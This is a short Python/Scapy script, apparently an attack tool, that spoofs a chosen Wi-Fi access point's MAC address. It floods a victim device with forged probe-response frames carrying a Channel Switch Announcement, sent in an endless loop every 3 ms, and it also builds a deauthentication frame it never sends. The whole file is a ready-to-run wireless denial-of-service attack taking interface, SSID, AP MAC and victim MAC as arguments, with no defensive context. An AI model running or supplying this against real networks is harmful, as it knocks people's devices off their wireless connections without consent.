from scapy.all import *
import sys

def csa_attack(iface, ssid, ap_mac, victim):
    print('[*] CSA Attack!')
    dot11 = Dot11(type=0, subtype=0xc, addr1=victim, addr2=ap_mac, addr3=ap_mac)
    deauth = Dot11Deauth(reason=7)
    deauthFrame = RadioTap()/dot11/deauth
    
    dot11 = Dot11(type=0, subtype=0x5, addr1=victim, addr2=ap_mac, addr3=ap_mac)
    probe_resp = Dot11ProbeResp(cap=0x1111)
    #probe_resp = Dot11ProbeResp()
    essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
    csa = Dot11Elt(ID=0x25,len=3,info='\x00\x0b\x01')

    probeRespFrame = RadioTap()/dot11/probe_resp/essid/csa

    print('[*] Start...!!')
    sendp(probeRespFrame, iface=iface, inter=0.003, loop=1)


if __name__ == '__main__':
    args = sys.argv
    if len(args)<4:
        print('python3 {0} <iface> <target ssid> <target AP MAC> <Victim MAC>'.format(args[0]))
        exit()

    iface = args[1]
    ssid = args[2]
    ap_mac = args[3]
    victim = args[4]
    csa_attack(iface, ssid, ap_mac, victim)


